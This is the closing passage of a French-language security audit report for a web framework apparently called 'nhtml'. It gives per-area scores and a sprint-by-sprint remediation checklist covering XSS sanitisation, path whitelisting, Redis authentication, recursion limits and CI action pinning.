| Tests | 9/10 | 0 | 0 | 1 |
| `.github/workflows/` | 8/10 | 0 | 0 | 2 |
| **GLOBAL** | **6.8/10** | **3** | **11** | **28** |

## 🚀 Plan d'action FINAL mis à jour

### 🚑 SPRINT 0 — Avant tout déploiement (< 48h)
- [ ] **CRIT-01** `bridge.js` → DOMPurify sur tous les opcodes HTML
- [ ] **CRIT-02** `cli.rs` → `html_escape::encode_safe()` sur handler_name/details DevTools
- [ ] **CLI-01** `cli.rs` → Corriger le template `nhtml new` (protocole réel)

### 🔥 SPRINT 1 — Semaine 1
- [ ] **HIGH-01/02** `router.php` → Whitelist + realpath + 404 générique
- [ ] **HIGH-03** `socket/mod.rs` → Fix CSWH parsing URL strict
- [ ] **HIGH-04** `cluster.rs` → Auth Redis + section [cluster] dans config template
- [ ] **HIGH-05** `cli.rs` → Confirmation avant npx localtunnel
- [ ] **HIGH-06** `cli.rs` → Remplacer xcopy par copie Rust pure
- [ ] **CONFIG-01** `config.rs` → Cascade résolution + --config CLI arg
- [ ] **CONFIG-02** `config.rs` → Exit fatal si config invalide
- [ ] **CONFIG-03** `main.rs` → Priorité CLI > Config > Défaut pour --port
- [ ] **CLI-02** `main.rs` → DevTools uniquement en mode --dev avec token auto

### 🛠️ SPRINT 2 — Semaines 2-4
- [ ] **MED-03/04** `nhtml.config.toml` → Sections [security] et [cluster] commentées
- [ ] **MED-06** `bridge.js` → localStorage → sessionStorage
- [ ] **MED-07** `bridge.js` → Vérifier HTTPS avant WASM
- [ ] **MED-08/09** `compiler/mod.rs` → Limite profondeur récursion (max 500)
- [ ] **MED-10/11/12** `btree_builder.rs`/`proto.rs` → Remplacer casts as u8/u16
- [ ] **MED-13/14** `session.rs` → Transactions SQL + DELETE batch TTL
- [ ] **CLI-04** `main.rs` → Masquer credentials DB dans les logs
- [ ] **CLI-03** `cli.rs` → exit(1) sur commandes non implémentées
- [ ] **MED-20/21** `release.yml` → Épingler actions par SHA + cache Cargo

### 📈 SPRINT 3 — Long terme
- [ ] Prometheus métriques réelles dans DevTools
- [ ] `nhtml check` — commande de validation pre-deploy
- [ ] `nhtml init` — génère nhtml.config.toml interactif
- [ ] Delta Sync à la reconnexion (last_seq)
- [ ] PHP HMR via PKT_PARTIAL_RELOAD
- [ ] WAL mode SQLite
- [ ] Circuit breaker PHP-FPM
- [ ] SSE fallback WebSocket
- [ ] SDK Python FastAPI production-ready
- [ ] OpenTelemetry distributed tracing

---
*Rapport finalisé — 3 critiques, 11 hautes, 28 moyennes sur 28 fichiers lus.*
